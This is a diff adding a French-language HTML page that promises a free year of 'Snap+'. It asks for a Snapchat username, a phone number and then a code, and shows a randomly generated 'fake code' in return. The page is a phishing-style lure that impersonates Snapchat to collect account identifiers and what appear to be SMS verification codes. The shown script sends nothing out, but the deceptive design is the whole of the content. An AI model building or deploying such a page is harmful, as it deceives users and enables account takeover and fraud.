@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snap+</title>
+    <style>
+        body {
+            background-color: #141414;
+            color: #f5f5f5;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: #242424;
+            border-radius: 10px;
+        }
+        .container img {
+            width: 100px;
+        }
+        .container h1 {
+            color: #f5f5f5;
+            font-size: 24px;
+        }
+        .container .disclaimer {
+            background-color: #343434;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .container .disclaimer p {
+            color: #f5f5f5;
+            font-size: 14px;
+        }
+        .container .input-group {
+            margin: 10px 0;
+        }
+        .container .input-group input {
+            padding: 10px;
+            margin: 5px;
+            border: none;
+            border-radius: 5px;
+            background-color: #343434;
+            color: #f5f5f5;
+        }
+        .container .button {
+            padding: 10px 20px;
+            background-color: #ffcc00;
+            border: none;
+            border-radius: 5px;
+            color: #141414;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="logo.png" alt="Snap+ Logo">
+        <h1>Snap+</h1>
+        <div class="disclaimer">
+            <p>Disclaimer: L'abonnement Snap+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.</p>
+        </div>
+        <h2>Active Snap+ gratuitement pendant 1 an !</h2>
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Nom d'utilisateur Snapchat">
+        </div>
+        <div class="input-group">
+            <span>+33</span>
+            <input type="text" id="phone" placeholder="Numéro de téléphone">
+        </div>
+        <button class="button" onclick="continueAction()">Continuer</button>
+        <div id="codeInput" style="display:none;">
+            <div class="input-group">
+                <input type="text" id="code" placeholder="Entrez le code">
+            </div>
+            <button class="button" onclick="verifyCode()">Valider le code</button>
+        </div>
+        <div id="fakeCode" style="display:none;">
+            <p>Votre code snap+ est : <span id="fakeCodeSpan"></span></p>
+        </div>
+    </div>
+    <script>
+        function continueAction() {
+            document.getElementById('codeInput').style.display = 'block';
+        }
+        function verifyCode() {
+            // Generate a fake code
+            const fakeCode = Math.random().toString(36).substr(2, 9);
+            document.getElementById('fakeCodeSpan').innerText = fakeCode;
+            document.getElementById('fakeCode').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
